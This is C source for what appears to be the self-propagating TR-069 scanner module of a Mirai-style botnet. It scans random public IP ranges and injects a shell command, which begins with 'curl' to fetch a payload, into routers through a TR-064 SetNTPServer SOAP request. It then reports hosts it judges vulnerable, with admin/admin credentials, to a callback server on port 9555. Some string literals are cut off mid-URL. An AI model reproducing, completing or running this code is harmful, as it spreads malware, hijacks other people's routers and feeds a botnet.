#ifdef SELFREP
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "includes.h"
#include "tr069_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
int tr069_scanner_pid = 0;
uint32_t tr069_fake_time = 0;
int tr069_ranges[] = {185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [%s] %s %d.%d.%d.%d:%d %s\n", 
            time_str, scanner, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, 
            port, details ? details : "");
    fclose(f);
}
static void tr069_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    uint16_t port_net = htons(port);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1;
    if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
static ipv4_t get_random_tr069_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        o1 = tr069_ranges[tmp % (sizeof(tr069_ranges)/sizeof(tr069_ranges[0]))];
        o2 = rand_next() & 0xff;
        o3 = rand_next() & 0xff;
        o4 = rand_next() & 0xff;
        tmp = INET_ADDR(o1, o2, o3, o4);
        if(o1 == 0 || o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224)
            continue;
    } while(tmp == LOCAL_ADDR || tmp == 0 || tmp == 0xffffffff);
    return tmp;
}
static int tr069_check_vulnerability(ipv4_t target_ip)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    addr.sin_port = htons(TR069_PORT);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if(errno != EINPROGRESS)
        {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
    {
        close(fd);
        return 0;
    }
    const char *infection_cmd = "curl -s https:
    char soap_body[1024];
    int body_len = snprintf(soap_body, sizeof(soap_body),
        "<?xml version=\"1.0\"?>\r\n"
        "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http:
        "<SOAP-ENV:Body>\r\n"
        "<u:SetNTPServer xmlns:u=\"urn:dslforum-org:service:Time:1\">\r\n"
        "<NewNTPServer1>;%s;</NewNTPServer1>\r\n"
        "</u:SetNTPServer>\r\n"
        "</SOAP-ENV:Body>\r\n"
        "</SOAP-ENV:Envelope>\r\n",
        infection_cmd);
    char soap_req[2048];
    int len = snprintf(soap_req, sizeof(soap_req),
        "POST / HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d:%d\r\n"
        "Content-Type: text/xml; charset=\"utf-8\"\r\n"
        "SOAPAction: \"urn:dslforum-org:service:Time:1#SetNTPServer\"\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "%s",
        (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff, TR069_PORT,
        body_len,
        soap_body);
    send(fd, soap_req, len, MSG_NOSIGNAL);
    char resp[2048];
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    if(select(fd + 1, &write_fds, NULL, NULL, &tv) > 0)
    {
        if(FD_ISSET(fd, &write_fds))
        {
            int recv_len = recv(fd, resp, sizeof(resp) - 1, 0);
            if(recv_len > 0)
            {
                resp[recv_len] = 0;
                if(strstr(resp, "200 OK") != NULL || strstr(resp, "500") != NULL)
                {
                    close(fd);
                    return 1;
                }
            }
        }
    }
    close(fd);
    return 0;
}
void tr069_scanner(void)
{
    tr069_scanner_pid = fork();
    if(tr069_scanner_pid > 0 || tr069_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    while(TRUE)
    {
        ipv4_t target_ip = get_random_tr069_ip();
        if(tr069_check_vulnerability(target_ip))
        {
            log_event("TR-069", "Vulnerable", target_ip, TR069_PORT, "TR-064 command injection");
            tr069_report(target_ip, TR069_PORT, "admin", "admin");
        }
        usleep(rand_next() % 1000000 + 500000);
    }
    exit(0);
}
void tr069_kill(void)
{
    if(tr069_scanner_pid > 0)
    {
        kill(tr069_scanner_pid, 9);
        tr069_scanner_pid = 0;
    }
}
#endif
